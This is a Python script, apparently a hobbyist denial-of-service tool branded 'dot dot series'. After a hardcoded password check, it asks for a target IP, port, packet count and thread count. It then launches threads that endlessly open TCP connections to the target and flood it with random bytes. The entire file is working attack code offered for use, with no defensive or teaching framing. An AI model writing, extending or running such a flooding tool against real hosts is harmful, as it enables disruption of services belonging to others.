import socket
import random
import threading
import time
import os

# Define the password required to access the main menu
PASSWORD = "man2314"

def get_ping(ip, port):
    """Calculate the ping to the specified IP and port."""
    try:
        start_time = time.time()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip, port))
        s.close()
        end_time = time.time()
        ping = int((end_time - start_time) * 1000)
        return ping
    except Exception as e:
        print(f"Error: Could not connect to {ip}:{port}. Reason: {e}")
        return None  # Return None if the server is unreachable

def start_attack(ip, port, pack):
    """Execute the DoS attack."""
    hh = random._urandom(10)
    xx = 0
    while True:
        try:
            ping = get_ping(ip, port)
            if ping is None:
                print("Target is unreachable. Waiting before retrying...")
                time.sleep(10)
                continue
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print(f"Attacking {ip} | Packets sent: {xx} | Ping: {ping}ms")
            s.close()
        except Exception as e:
            print("Error: Connection failed during attack:", e)
            time.sleep(10)

def attack_menu():
    """Gather attack parameters and start DoS attack."""
    ip = input("[Q] Target IP: ")
    port = int(input("[Q] Port (must be a number): "))
    pack = int(input("[Q] Packet/s (must be a number): "))
    thread_count = int(input("[Q] Thread (must be a number): "))

    # Clear screen
    time.sleep(2)
    os.system("cls" if os.name == "nt" else "clear")

    print("-------------------------------------------")
    print("            _____    ____      ____        ")
    print("              |     |    |    |    |   |   ")
    print("(dot)(dot)    |     |    |    |    |   |   ")
    print("  O    O      |     |____|    |____|   |___")
    print("-------------------------------------------")
    print("first installation in the dot dot series")
    print("made by: EUMonk")
    print("-------------------------------------------")
    
    time.sleep(2)
    
    # Start DoS attack threads
    for _ in range(thread_count):
        attack_thread = threading.Thread(target=start_attack, args=(ip, port, pack))
        attack_thread.start()

def main():
    print("Welcome to the dot dot series")
    print("Please enter the password to proceed:")
    password = input("Password: ")
    
    # Check if the entered password matches the required password
    if password == PASSWORD:
        print("Access granted.")
        while True:
            print("\nSelect an option:")
            print("1) DoS Attack")
            print("2) Exit")
            choice = input("Enter your choice: ")
            
            if choice == "1":
                attack_menu()
            elif choice == "2":
                print("Exiting the program.")
                break
            else:
                print("Invalid option. Please try again.")
    else:
        print("Access denied. Exiting program.")

if __name__ == "__main__":
    main()